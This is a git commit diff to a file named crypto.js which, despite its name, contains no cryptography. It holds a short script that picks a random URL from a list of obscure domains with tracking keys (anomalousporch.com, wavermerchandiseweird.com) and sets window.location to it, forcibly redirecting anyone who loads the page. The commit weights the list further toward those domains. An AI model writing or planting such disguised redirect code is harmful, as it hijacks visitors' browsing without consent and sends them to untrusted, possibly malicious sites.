35f3c2f98ce1315326fe41e9eefd89357729648c
itsmeplayfj <94605694+itsmeplayfj@users.noreply.github.com>
2022-03-01 12:42:22 -0600

    Update crypto.js

--- crypto.js
+++ crypto.js
@@ -1,11 +1,11 @@
 var dataUrl = [
+'//anomalousporch.com/hh9m6iq8u?key=b1b4a076f4bf1c1aa140cc71754f0d67',
+'//anomalousporch.com/hh9m6iq8u?key=b1b4a076f4bf1c1aa140cc71754f0d67',
+'//anomalousporch.com/bcf9j7den?key=6f0346ec565f3485f607d1f027ca2032',
 'https://screenmovies3.blogspot.com',
-'//anomalousporch.com/hh9m6iq8u?key=b1b4a076f4bf1c1aa140cc71754f0d67',
 '//wavermerchandiseweird.com/z0sfd1pts?key=2431d39c120107799ee55bcab97fc536',
 '//wavermerchandiseweird.com/z0sfd1pts?key=2431d39c120107799ee55bcab97fc536',
-'//wavermerchandiseweird.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851',
-'//anomalousporch.com/hh9m6iq8u?key=b1b4a076f4bf1c1aa140cc71754f0d67',
-'//anomalousporch.com/bcf9j7den?key=6f0346ec565f3485f607d1f027ca2032'
+'//wavermerchandiseweird.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
